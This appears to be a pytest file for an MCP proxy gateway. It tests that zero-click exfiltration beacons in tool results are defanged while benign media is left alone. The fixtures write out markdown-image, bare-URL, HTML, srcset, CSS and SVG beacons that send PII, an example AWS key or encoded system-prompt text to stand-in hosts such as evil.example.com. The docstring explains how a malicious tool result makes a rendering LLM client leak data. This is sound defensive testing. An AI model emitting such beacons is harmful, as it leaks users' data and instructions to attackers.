"""CHG-0096: defang zero-click auto-render EXFIL BEACONS in MCP tool RESULTS.

A malicious upstream MCP tool result can embed a markdown-image
``![x](https://evil/?d=<data>)`` (or a bare beacon URL) that a markdown-rendering
LLM client AUTO-FETCHES on render — a zero-click exfil of arbitrary data the text
regexes never recognise as a secret. This egress BYPASSES the chat output guard (the
MCP proxy is a distinct API surface). The orchestrator now runs
``neutralize_exfil_channels`` (parity with the chat guard G40-G43): it masks the
smuggled payload and strips the auto-render (image -> plain link), a STRICT no-op on
benign markdown/URLs (gated by ``_url_smuggles_data``).

These tests drive the REAL result floor (``_scan_tool_result_floor``) and assert on the
EGRESS BYTES: the beacon no longer auto-renders, benign media is untouched.
"""
from __future__ import annotations

import base64
import json
import re
import sys
from pathlib import Path

import pytest

_GW = Path(__file__).resolve().parents[1]
if str(_GW) not in sys.path:
    sys.path.insert(0, str(_GW))
_SHARED = _GW.parents[1] / "shared"
if _SHARED.is_dir() and str(_SHARED) not in sys.path:
    sys.path.append(str(_SHARED))

import mcp_proxy  # noqa: E402

# base64 of arbitrary printable text (system prompt / conversation) — a realistic
# opaque exfil payload the text regexes do NOT recognise as a secret.
_B64 = base64.b64encode(b"system prompt: you are a secret agent; full conversation log here").decode()


# STRICT OPERATOR CONTROL (2026-07-21): the CHG-0096 exfil-beacon defang is a static
# hardening floor — it fires only under an operator-selected ENFORCING posture. These
# tests used to pass ``enabled_info=None``, which resolves to observe-only ``tag``
# (detect + tag, never mutate); see
# ``test_exfil_beacon_not_defanged_under_observe_only_posture`` for that half of the
# contract. They now select ``redact`` explicitly.
_ENFORCING = {"default_scan_action": "redact"}


async def _floor(text: str):
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": text}]},
        tool_name="fetch", enabled_info=_ENFORCING, org_slug="o", server_slug="s", actor=None)
    return json.dumps(scanned), blocked, tags, findings, meta


# __PDD_PRESET_FIXTURE__

# policy-driven-detection cutover (task 9): the MCP built-in default detectors (the Tier-1
# PRESET pass) are now EFFECTIVE-DEFAULT OFF (mcp_scan_orchestrator._mcp_default_detection_enabled)
# so a zero-enabled-policy org is passthrough. This module exercises the RETAINED preset
# DETECTION MACHINERY (redaction / fail-closed byte-truth / exfil-defang / authz / audit), which
# stays reachable via the explicit opt-in env. Enable it for this module so those invariants are
# still tested. The default-OFF (Zero_Policy_State passthrough) contract is asserted by the
# dedicated test_policy_driven_* modules, not weakened here.
import os as _os_pdd


@pytest.fixture(autouse=True)
def _enable_builtin_mcp_presets(monkeypatch):
    monkeypatch.setenv("GATEWAY_MCP_DEFAULT_DETECTION", "true")
    monkeypatch.setenv("GATEWAY_MCP_REDACT_RESULT_ON_DETECT", "true")
    yield


def _auto_renders(blob: str) -> bool:
    """True if a zero-click markdown-image auto-render beacon survives in the egress."""
    return bool(re.search(r'!\[[^\]]*\]\(\s*https?://', blob))


# (name, tool-result text with an auto-render beacon)
_BEACONS = [
    ("pii_in_image", "See ![a](https://attacker.io/c?leak=john.doe@corp.example) now"),
    ("secret_in_image", "![k](https://evil.example.com/c?d=AKIAIOSFODNN7EXAMPLE)"),
    ("b64_data_image", f"Report ready ![x](https://evil.example.com/l?d={_B64}) done"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(("name", "text"), _BEACONS)
async def test_markdown_image_exfil_beacon_defanged(name, text):
    blob, blocked, tags, findings, meta = await _floor(text)
    assert not _auto_renders(blob), f"{name}: zero-click auto-render beacon survived: {blob}"
    assert "[exfil-redacted]" in blob, f"{name}: smuggled payload not masked"
    # the defang produced an exfil finding for audit.
    # (``meta["result_redaction_floor"]`` is NOT asserted: it marks the E12 RE-SCAN
    # floor, which only fires when the first pass left the result unmutated. Under an
    # explicit ``redact`` posture the orchestrator defangs inline on the first pass, so
    # the flag is legitimately absent — the contract is the egress bytes above plus the
    # exfil finding, not which internal path produced them.)
    assert any((f.get("threat_type") == "exfil") for f in findings)


@pytest.mark.asyncio
async def test_bare_url_with_pii_defanged():
    text = "contact via https://evil.example.com/?leak=john.doe@corp.example please"
    blob, blocked, tags, findings, meta = await _floor(text)
    assert "john.doe@corp.example" not in blob
    assert "[exfil-redacted]" in blob


@pytest.mark.asyncio
@pytest.mark.parametrize("text", [
    "Here is a diagram ![chart](https://cdn.example.com/chart.png) as requested",
    "![logo](https://assets.example.com/logo.svg)",
    "See [our docs](https://docs.example.com/guide) for details",
    "The weather in Paris today is sunny and 21C",
    "Presigned ![img](https://s3.example.com/b/k?X-Amz-Signature=abcdef123456ghijkl)",
])
async def test_benign_media_and_text_untouched(text):
    """Strict no-op on benign markdown / URLs (gated by _url_smuggles_data)."""
    blob, blocked, tags, findings, meta = await _floor(text)
    assert text in blob, f"benign content was altered: {blob}"
    assert not blocked
    assert not any((f.get("threat_type") == "exfil") for f in findings)


# ── CHG-0097: HTML/SVG/CSS/srcset beacons NESTED in a JSON result field ──────────
# The MCP tier-1 scan target is the whole payload JSON-serialized, so HTML attribute
# quotes are escaped (src=\"...\") and neutralize_exfil_channels's HTML regexes missed
# them (CHG-0096 residual). _neutralize_exfil_deep parses the JSON and neutralizes each
# UNESCAPED string leaf, so HTML/srcset/CSS beacons are defanged too.
_HTML_BEACONS = [
    ("html_img", f'<img src="https://evil.example.com/t?d={_B64}">'),
    ("html_srcset", f'<img srcset="https://evil.example.com/s?d={_B64} 2x">'),
    ("css_url", f'<div style="background:url(https://evil.example.com/b?d={_B64})">'),
    ("svg_image_href", f'<image href="https://evil.example.com/i?d={_B64}"/>'),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(("name", "text"), _HTML_BEACONS)
async def test_html_nested_beacon_defanged(name, text):
    blob, blocked, tags, findings, meta = await _floor(text)
    assert "[exfil-redacted]" in blob, f"{name}: HTML beacon payload not masked: {blob}"
    assert "evil.example.com" not in blob, f"{name}: attacker host survived: {blob}"
    assert any((f.get("threat_type") == "exfil") for f in findings)


@pytest.mark.asyncio
@pytest.mark.parametrize("text", [
    '<img src="https://cdn.example.com/logo.png">',
    '<img src="https://cdn.example.com/img?w=100&h=50">',
    '<img src="https://s3.example.com/b/k?X-Amz-Signature=abcdef1234567890">',
])
async def test_benign_html_media_untouched(text):
    """Benign HTML images (no smuggled payload) are NOT defanged — strict no-op."""
    blob, blocked, tags, findings, meta = await _floor(text)
    assert "[exfil-redacted]" not in blob, f"benign HTML image was false-defanged: {blob}"
    # the host+path survives (only the JSON quote-escaping differs from the raw input)
    host_path = text.split('src="')[1].rstrip('">').split("?")[0].replace("https://", "")
    assert host_path in blob, f"benign HTML content was altered: {blob}"
    assert not any((f.get("threat_type") == "exfil") for f in findings)


# ── CHG-0099: markdown-split / encoded PII-secret in a tool result ───────────────
# A PII/secret whose chars are interleaved with inline markdown emphasis / code / HTML
# markers (1**2**3-45-6789 renders as an SSN) evaded the raw regexes, but a markdown
# client reconstructs the value on render. CHG-0096 only wired neutralize_exfil_channels
# into the MCP path; CHG-0099 adds neutralize_encoded_pii + neutralize_markdown_split_pii
# (full chat-output-guard parity).
def _rendered(md: str) -> str:
    return md.replace("**", "").replace("*", "").replace("`", "").replace("_", "")


_MD_SPLIT_LEAKS = [
    ("ssn", "The SSN is 1**2**3-45-6789 exactly", "123-45-6789"),
    ("email", "Contact john`@`example.com now", "john@example.com"),
    ("awskey", "key AKIA**IOSFODNN7**EXAMPLE here", "AKIAIOSFODNN7EXAMPLE"),
    ("cc", "card 4111**-1111-1111-**1111 ok", "4111-1111-1111-1111"),
    ("html_entity_ssn", "ssn 1&#50;3-45-6789 here", "123-45-6789"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(("name", "text", "sensitive"), _MD_SPLIT_LEAKS)
async def test_markdown_split_pii_secret_neutralized(name, text, sensitive):
    blob, blocked, tags, findings, meta = await _floor(text)
    assert sensitive not in _rendered(blob), f"{name}: sensitive value reconstructs on render: {blob}"
    assert "[PII_REDACTED]" in blob
    assert any((f.get("threat_type") == "exfil") for f in findings)
    # ``result_redaction_floor`` is not asserted — see
    # test_markdown_image_exfil_beacon_defanged for why (inline first-pass redaction).


@pytest.mark.asyncio
@pytest.mark.parametrize("text", [
    "This is **important** and `code` and _emphasis_ text",
    "compute 2*3 and reference a_b_c in the formula",
    "run `npm install` then `npm run build` to compile",
    "The **quarterly** report shows *strong* growth this year",
])
async def test_benign_markdown_untouched(text):
    """Strict no-op on benign markdown (only a run whose stripped form is PII/secret masks)."""
    blob, blocked, tags, findings, meta = await _floor(text)
    assert text in blob, f"benign markdown was altered: {blob}"
    assert "[PII_REDACTED]" not in blob
    assert not any((f.get("threat_type") == "exfil") for f in findings)


def test_findings_have_exfil_helper():
    fn = mcp_proxy._findings_have_exfil
    assert fn([{"threat_type": "exfil"}]) is True
    assert fn([{"threat_type": "pii"}]) is False
    assert fn([]) is False
    assert fn(None) is False


def test_neutralize_exfil_deep_handles_plain_and_json():
    import mcp_scan_orchestrator as orch
    # plain (non-JSON) text neutralized directly
    plain = "![x](https://evil.example.com/l?d=" + _B64 + ")"
    assert "[exfil-redacted]" in orch._neutralize_exfil_deep(plain)
    # benign JSON returned byte-identical (no reformatting churn)
    benign_json = json.dumps({"content": [{"type": "text", "text": "hello world"}]})
    assert orch._neutralize_exfil_deep(benign_json) == benign_json
    # malformed JSON falls back to direct neutralization (no crash)
    assert orch._neutralize_exfil_deep("{not valid json") == "{not valid json"


# ── CHG-0114: deeply-nested JSON result must not DoS the render-leak walk. The walk
# is depth-bounded + fail-safe, so a multi-thousand-deep untrusted result cannot
# exhaust the Python stack (RecursionError) and silently disable exfil neutralization.


def _nest(n, leaf="x"):
    o = leaf
    for _ in range(n):
        o = [o]
    return o


@pytest.mark.parametrize("depth", [2000, 6000, 20000])
def test_deep_nested_json_does_not_recursion_error(depth):
    import mcp_scan_orchestrator as orch
    # Must return (no RecursionError) regardless of nesting depth.
    out = orch._neutralize_exfil_deep(json.dumps(_nest(depth)))
    assert isinstance(out, str)


def test_shallow_beacon_still_defanged_after_depth_cap():
    import mcp_scan_orchestrator as orch
    beacon = "![x](https://evil.example.com/l?d=" + _B64 + ")"
    payload = json.dumps({"a": {"b": {"c": "see " + beacon}}})
    out = orch._neutralize_exfil_deep(payload)
    assert "![x](https://evil" not in out  # auto-render stripped at a realistic depth


def test_beacon_within_cap_defanged():
    import mcp_scan_orchestrator as orch
    beacon = "![x](https://evil.example.com/l?d=" + _B64 + ")"
    out = orch._neutralize_exfil_deep(json.dumps(_nest(150, leaf="see " + beacon)))
    assert "![x](https://evil" not in out


@pytest.mark.asyncio
async def test_floor_survives_deeply_nested_result():
    # The full result floor must not 500 / RecursionError on a deep untrusted result.
    blob, blocked, tags, findings, meta = await _floor(json.dumps(_nest(8000)))
    assert isinstance(blob, str)  # returned cleanly (no exception propagated)



@pytest.mark.asyncio
@pytest.mark.parametrize("posture", ["tag", "monitor"])
async def test_exfil_beacon_not_defanged_under_observe_only_posture(posture):
    """OPERATOR SOVEREIGNTY: under "Tag only"/Monitor the floors do NOT mutate egress.

    ``tag`` is the operator-selectable "Tag only" action AND the server default;
    ``_effective_scan_action`` documents it as "observe only, never mutate". Static
    hardening floors previously fired anyway whenever ``enabled_info`` was absent, so a
    tool result was rewritten under a posture the operator chose precisely to avoid
    that. Detection/tagging still happen — only the mutation is withheld.
    """
    text = f"Report ready ![x](https://evil.example.com/l?d={_B64}) done"
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": text}]},
        tool_name="fetch",
        enabled_info={"default_scan_action": posture},
        org_slug="o", server_slug="s", actor=None,
    )
    blob = json.dumps(scanned)
    assert text in blob, f"observe-only posture {posture} mutated the result: {blob}"
    assert not blocked
    assert not meta.get("result_redaction_floor")


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
